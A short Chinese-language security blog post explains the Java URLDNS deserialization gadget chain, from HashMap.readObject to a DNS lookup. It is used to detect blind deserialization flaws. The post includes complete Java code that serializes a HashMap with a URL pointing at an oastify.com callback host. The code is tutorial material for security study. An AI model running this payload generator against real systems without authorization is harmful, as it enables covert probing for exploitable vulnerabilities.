---
title: "URLDNS链"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# URLDNS链

## 概述

URLDNS链，在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞

其中 HashMap类重写了readobject 方法，readobject 方法会读取一个序列化文件流：

* 在 readObject 方法中的 putVal 方法会调用 hash 方法

* hash 方法下会调用URL类的 hashCode 方法，当 hashCode 属性不等于-1，会调用 handler.hashCode 方法
* 继续跟进会调用getHostAddress 方法
* 最后调用InetAddress.getByName 方法触发DNS请求

payload：

~~~java
package com.yuy0ung.fundamentals;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializationTest {
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        Person person = new Person("aa", 22);
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
        //为了不触发url请求，修改hashcode不是-1
        URL url = new URL("http://187ukw81mwpvmptw82esrl8yvp1hpadz.oastify.com");
        Class c = url.getClass();
        Field hashcodefield = c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,1234);
        hashmap.put(url, 1);
        //为了反序列化时触发url请求，修改hashcode为-1
        hashcodefield.set(url,-1);
        serialize(hashmap);
    }

}

~~~

非常简单的一条链子，没什么好说的